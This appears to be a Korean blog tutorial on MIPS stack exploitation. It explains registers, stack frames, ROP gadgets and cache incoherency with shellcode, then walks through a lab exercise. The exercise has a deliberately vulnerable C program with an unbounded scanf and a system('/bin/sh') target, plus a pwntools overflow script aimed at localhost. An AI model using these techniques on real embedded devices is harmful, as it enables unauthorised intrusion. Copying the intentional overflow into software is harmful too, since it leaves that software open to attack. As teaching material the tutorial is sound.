<p>&#xB2E4;&#xC18C; &#xC774;&#xC9C8;&#xC801;&#xC778; &#xC774; MIPS&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBD80;&#xBD84;&#xC744; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<h2 id="1-MIPS-vs-MIPSEL"><a href="#1-MIPS-vs-MIPSEL" class="headerlink" title="1. MIPS vs MIPSEL"></a>1. MIPS vs MIPSEL</h2><p><img src="image2.jpg" srcset="/img/loading.gif" alt="image2.jpg"></p>
<p>MIPS&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBA85;&#xB839;&#xC774; &#xD558;&#xB098;&#xC758; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xC911;&#xC5D0; &#xD558;&#xB098; &#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xB9CE;&#xC544;&#xC9C4;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xC774; &#xC788;&#xC9C0;&#xB9CC;, &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xADF8;&#xB85C; &#xC778;&#xD574; &#xC804;&#xB825; &#xC18C;&#xBAA8;&#xAC00; &#xC801;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p>
<p>MIPS&#xB294; &#xBA85;&#xB839;&#xC5B4; &#xC138;&#xD2B8;&#xAC00; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB300;&#xD559; &#xCEF4;&#xD4E8;&#xD130; &#xAD6C;&#xC870; &#xB54C; &#xAC00;&#xB974;&#xCE58;&#xB294; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xAC00; MIPS&#xC778; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;(&#xC800;&#xB3C4; &#xADF8;&#xB7AC;&#xC2B5;&#xB2C8;&#xB2E4;)&#x2026;</p>
<p>MIPS&#xB294; &#xBE45;&#xC5D4;&#xB514;&#xC548;, MIPSEL&#xC740; &#xB9AC;&#xD2C0;&#xC5D4;&#xB514;&#xC548;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. MIPSEL&#xC740; &#xB370;&#xC774;&#xD130; &#xC800;&#xC7A5; &#xBC29;&#xC2DD;&#xB9CC; &#xB9AC;&#xD2C0;&#xC5D4;&#xB514;&#xC548;&#xC73C;&#xB85C; &#xCC44;&#xD0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, MIPS&#xC640; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874;&#xC5D0; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; x86-64 &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0;&#xC11C;&#xB3C4; &#xB370;&#xC774;&#xD130; &#xC800;&#xC7A5; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, MIPSEL&#xB3C4; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; pwntools &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, MIPSEL &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; pwntools&#xC758; <code>p32()</code>, <code>p64()</code>&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p>
<h2 id="2-MIPS-Stack-amp-Register"><a href="#2-MIPS-Stack-amp-Register" class="headerlink" title="2. MIPS Stack &amp; Register"></a>2. MIPS Stack &amp; Register</h2><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC55E;&#xC11C; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD; &#xAD6C;&#xC131;&#xACFC; &#xB3D9;&#xC791;&#xC744; &#xC774;&#xD574;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>MIPS &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC758; &#xACF5;&#xC2DD; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xB294; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf">MIPS32 Architecture For Programmers Volume I</a>&#xACFC; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf">MIPS Assembly Language Programmer&#x2019;s Guide</a> &#xC785;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xC911; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xC9C0;&#xC2DD;&#xC744; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120;, MIPS&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBAA9;&#xB85D;&#xACFC; &#xC5ED;&#xD560;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>&#xC774;&#xB984;</th>
<th>&#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC88;&#xD638;</th>
<th>&#xC5ED;&#xD560;</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><code>$zero</code></strong></td>
<td><strong><code>$0</code></strong></td>
<td>0&#xC744; &#xCD9C;&#xB825;</td>
</tr>
<tr>
<td><strong><code>$at</code></strong></td>
<td><strong><code>$1</code></strong></td>
<td>&#xC758;&#xC0AC; &#xBA85;&#xB839;&#xC5B4; &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xB97C; &#xC704;&#xD574; &#xC608;&#xC57D;</td>
</tr>
<tr>
<td><strong><code>$v0</code> ~ <code>$v1</code></strong></td>
<td><strong><code>$2</code> ~ <code>$3</code></strong></td>
<td>&#xD568;&#xC218;&#xB85C;&#xBD80;&#xD130; &#xBC18;&#xD658; &#xB41C; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td>
</tr>
<tr>
<td><strong><code>$a0</code> ~ <code>$a3</code></strong></td>
<td><strong><code>$4</code> ~ <code>$7</code></strong></td>
<td>&#xD568;&#xC218; &#xC778;&#xC218; &#xC800;&#xC7A5;</td>
</tr>
<tr>
<td><strong><code>$t0</code> ~ <code>$t7</code></strong></td>
<td><strong><code>$8</code> ~ <code>$15</code></strong></td>
<td>&#xC5B4;&#xC148;&#xBE14;&#xB7EC;&#xB098; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xC784;&#xC2DC; &#xC800;&#xC7A5; &#xC2DC; &#xC0AC;&#xC6A9;</td>
</tr>
<tr>
<td><strong><code>$s0</code> ~ <code>$s7</code></strong></td>
<td><strong><code>$16</code> ~ <code>$23</code></strong></td>
<td>&#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xC9C0;&#xC18D;&#xB418;&#xB294; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;</td>
</tr>
<tr>
<td><strong><code>$t8</code> ~ <code>$t9</code></strong></td>
<td><strong><code>$24</code> ~ <code>$25</code></strong></td>
<td>&#xC5B4;&#xC148;&#xBE14;&#xB7EC;&#xB098; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xC784;&#xC2DC;&#xB85C; &#xC800;&#xC7A5;</td>
</tr>
<tr>
<td><strong><code>$k0</code> ~ <code>$k1</code></strong></td>
<td><strong><code>$26</code> ~ <code>$27</code></strong></td>
<td>OS &#xCEE4;&#xB110;&#xC744; &#xC704;&#xD574; &#xC608;&#xC57D;</td>
</tr>
<tr>
<td><strong><code>$gp</code></strong></td>
<td><strong><code>$28</code></strong></td>
<td>&#xC804;&#xC5ED; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td>
</tr>
<tr>
<td><strong><code>$sp</code></strong></td>
<td><strong><code>$29</code></strong></td>
<td>&#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td>
</tr>
<tr>
<td><strong><code>$fp</code>/<code>$s8</code></strong></td>
<td><strong><code>$30</code></strong></td>
<td>&#xD504;&#xB808;&#xC784; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;</td>
</tr>
<tr>
<td><strong><code>$ra</code></strong></td>
<td><strong><code>$31</code></strong></td>
<td>&#xC8FC;&#xC18C; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xC800;&#xC7A5;</td>
</tr>
</tbody>
</table>
</div>
<p>&#xC774;&#xC911; &#xB208; &#xC5EC;&#xACA8; &#xBD10;&#xC57C; &#xD560; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; <code>ra</code>, <code>sp</code>, <code>s8</code>&#xC785;&#xB2C8;&#xB2E4;.</p>
<p>MIPS&#xC5D0;&#xC11C;&#xB294; <code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xD568;&#xC218; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. x86/x64&#xC758; <code>RET</code>&#xC758; &#xC5ED;&#xD560;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs nasm">0x00400734 &lt;main+0&gt;:    addiu   sp,sp,-136
0x00400738 &lt;main+4&gt;:    sw      ra,132(sp)
0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)
0x00400740 &lt;main+12&gt;:   move    s8,sp
...
0x004007d8 &lt;main+164&gt;:  move    sp,s8
0x004007dc &lt;main+168&gt;:  lw      ra,132(sp)
0x004007e0 &lt;main+172&gt;:  lw      s8,128(sp)
0x004007e4 &lt;main+176&gt;:  addiu   sp,sp,136
0x004007e8 &lt;main+180&gt;:  jr      ra</code></pre>
<p>&#xD568;&#xC218; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xB97C; &#xD1B5;&#xD574; <code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xD568;&#xC218; &#xC5D0;&#xD544;&#xB85C;&#xADF8;&#xB97C; &#xD1B5;&#xD574; <code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB85C; &#xC774;&#xB3D9;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p>
<p><code>ra</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; <code>sp</code>(&#xD604;&#xC7AC; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;)&#xC640; <code>s8</code>(&#xD504;&#xB808;&#xC784; &#xD3EC;&#xC778;&#xD130;) &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <code>sp</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBC84;&#xD37C; &#xC2DC;&#xC791; &#xC704;&#xCE58;&#xC640; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAD6C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC758; &#xCCAB;&#xAC78;&#xC74C;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs nasm">lw      $s2, 24(sp)      ; sp+24 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $s2&#xC5D0; &#xB85C;&#xB4DC; (&amp;&quot;/bin/sh&quot; &#xC8FC;&#xC18C;)
lw      $s1, 20(sp)      ; sp+20 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $s1&#xC5D0; &#xB85C;&#xB4DC; (&amp;system &#xC8FC;&#xC18C;)
lw      $s0, 16(sp)      ; sp+16 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $s0&#xC5D0; &#xB85C;&#xB4DC; (&amp;sleep &#xC8FC;&#xC18C;)
lw      $ra, 28(sp)      ; sp+28 &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC744; $ra&#xC5D0; &#xB85C;&#xB4DC; (&#xB2E4;&#xC74C; &#xAC00;&#xC82F; &#xC8FC;&#xC18C;)
addiu   sp, sp, 32       ; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130; &#xC815;&#xB9AC;
jr      $ra              ; $ra(&#xB2E4;&#xC74C; &#xAC00;&#xC82F;)&#xB85C; &#xC810;&#xD504;</code></pre>
<p>&#xC774;&#xD6C4;&#xC5D0; &#xC124;&#xBA85;&#xD560; Shellcode &#xBC0F; ROP &#xCCB4;&#xC778;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xD55C; &#xAC00;&#xC82F;&#xC758; &#xD615;&#xD0DC;&#xB97C; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><code>s0-s7</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD; &#xB0B4; &#xAC12;&#xC744; <code>lw</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xB85C;&#xB4DC;&#xD558;&#xACE0;, <code>addiu</code>&#xB85C; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC815;&#xB9AC;&#xD55C; &#xD6C4;, &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB85C; <code>jr</code>&#xD558;&#xB294; &#xD615;&#xD0DC;&#xAC00; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p>&#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD615;&#xD0DC;&#xC774;&#xBBC0;&#xB85C;, &#xC0C1;&#xD669;&#xACFC; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xCDB0; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC790;&#xC640; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC798; &#xC870;&#xD569;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs nasm">move    $t9, $s1         ; $s1(system &#xC8FC;&#xC18C;)&#xC744; $t9(&#xD638;&#xCD9C;&#xC6A9; &#xB808;&#xC9C0;&#xC2A4;&#xD130;)&#xB85C; &#xC774;&#xB3D9;
jalr    $t9              ; $t9&#xC5D0; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xC810;&#xD504;</code></pre>
<p>&#xD568;&#xC218; &#xC2E4;&#xD589;&#xC740; <code>jalr</code> &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. x86-64&#xC758; <code>call</code>&#xACFC; &#xAC19;&#xC740; &#xBA85;&#xB839;&#xCC98;&#xB7FC; &#xB3D9;&#xC791; &#xB41C;&#xB2E4;&#xACE0; &#xC774;&#xD574;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
<h2 id="3-Cache-Incoherency"><a href="#3-Cache-Incoherency" class="headerlink" title="3. Cache Incoherency"></a>3. Cache Incoherency</h2><p>MIPS &#xD658;&#xACBD;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB41C; &#xC2E4;&#xC81C; &#xC7A5;&#xBE44;&#xB97C; &#xC775;&#xC2A4;&#xD560; &#xB54C;, IoT/&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44; &#xD2B9;&#xC131; &#xC0C1; Shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; Shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xB294; &#xC8FC;&#xC758;&#xD560; &#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xBC14;&#xB85C; Cache&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><img src="image3.png" srcset="/img/loading.gif" alt="image3.png"></p>
<p>MIPS&#xC5D0;&#xC11C;&#xB294; opcode&#xAC00; &#xB4E4;&#xC5B4;&#xC788;&#xB294; Instruction Cache, &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294; Data Cache &#xB450; &#xAC00;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xB54C;, &#xC6B0;&#xB9AC;&#xAC00; &#xC785;&#xB825;&#xD558;&#xB294; &#xAC12;(Shellcode)&#xC740; Data Cache&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB418;&#xB294;&#xB370;, CPU&#xB294; &#xAE30;&#xC874;&#xC5D0; &#xBA85;&#xB839;&#xC774; &#xB4E4;&#xC5B4;&#xAC04; Instruction Cache&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; Cache Incoherency(&#xCE90;&#xC2DC; &#xBE44;&#xC77C;&#xAD00;&#xC131;) &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Data Cache&#xC5D0;&#xC11C; Instruction Cache&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; Cache &#xC4F0;&#xAE30; &#xC815;&#xCC45;&#xC5D0; &#xB530;&#xB77C;, &#xBA54;&#xBAA8;&#xB9AC;&#xC640; &#xB3D9;&#xAE30;&#xD654; &#xD55C; &#xD6C4; Instruction Cache&#xB97C; &#xBE44;&#xC6B0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xAC83;&#xC740; &#xBC14;&#xB85C; Data Cache&#xB97C; flush&#xD558;&#xC5EC; Cache write&#xB97C; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="image4.png" srcset="/img/loading.gif" alt="image4.png"></p>
<p>Data Cache&#xAC00; flush&#xAC00; &#xB41C; &#xD6C4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC640; Cache &#xC0C1;&#xD0DC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. Instruction Cache&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xBA85;&#xB839;&#xC774; &#xB3D9;&#xC77C;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C;, Instruction Cache&#xB97C; &#xBE44;&#xC6C1;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xC640; &#xB3D9;&#xAE30;&#xD654; &#xB41C; Data Cache&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xC774;&#xB7F0; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0;&#xC57C; &#xBE44;&#xB85C;&#xC18C; &#xC0BD;&#xC785;&#xD55C; Shellcode&#xAC00; &#xC2E4;&#xD589;&#xC774; &#xB420; &#xC218; &#xC788;&#xB294; &#xD750;&#xB984;&#xC774; &#xB41C;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="image5.png" srcset="/img/loading.gif" alt="image5.png"></p>
<p>&#xAC00;&#xC7A5; &#xC190;&#xC26C;&#xC6B4; &#xBC29;&#xBC95;&#xC740; <code>sleep()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><code>sleep()</code> &#xD638;&#xCD9C; &#xC2DC;, &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB098; &#xC2A4;&#xB808;&#xC2A4;&#xC5D0; &#xC2E4;&#xD589;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, Data Cache&#xC5D0; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; Cache &#xC4F0;&#xAE30; &#xC815;&#xCC45;&#xC5D0; &#xB530;&#xB77C;, flush&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB3C4; Data Cache&#xAC00; write &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xB530;&#xB77C;&#xC11C;, MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74;, <code>sleep()</code> &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h2 id="4-MIPS-Exploit-Practice"><a href="#4-MIPS-Exploit-Practice" class="headerlink" title="4. MIPS Exploit Practice"></a>4. MIPS Exploit Practice</h2><p>&#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574;&#xC11C; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC5F0;&#xC2B5;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h3 id="4-1-RTL"><a href="#4-1-RTL" class="headerlink" title="4-1: RTL"></a>4-1: RTL</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">target</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>
<span class="hljs-function"></span>{
        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);

        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<p>MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; RTL&#xC744; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD; &#xB0B4; offset&#xC744; &#xAD6C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; bof&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC608;&#xC81C; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs nasm">0x00400738 &lt;main+4&gt;:    sw      ra,132(sp)  ; ret
0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)
0x00400740 &lt;main+12&gt;:	  move	  s8,sp
...
0x0040079c &lt;main+104&gt;:	addiu	  v0,s8,24  ; buf
0x004007a0 &lt;main+108&gt;:	move	  a1,v0
...
0x004007b0 &lt;main+124&gt;:	jalr	  t9  ; scanf</code></pre>
<p>gdb&#xB85C; &#xC5B4;&#xC148;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; offset&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<ul>
<li>&#xB9AC;&#xD134; &#xC8FC;&#xC18C;: <code>sp + 132</code></li>
</ul>
<p>&#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; ra &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; sp+132 &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<ul>
<li>&#xBC84;&#xD37C; &#xC2DC;&#xC791;: <code>sp + 24</code></li>
</ul>
<p>scanf()&#xC758; &#xC778;&#xC790;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130; <code>sp</code> &#x2192; <code>s8 + 24</code> &#xC5F0;&#xC0B0;&#xC774; &#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xB530;&#xB77C;&#xC11C; offset&#xC740; 132 - 24 = 108&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)

sh = <span class="hljs-number">0x4006e0</span>

pay = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">108</span>
pay += p32(sh)

p.sendline(pay)
p.interactive()</code></pre>
<p><img src="image6.png" srcset="/img/loading.gif" alt="image6.png"></p>
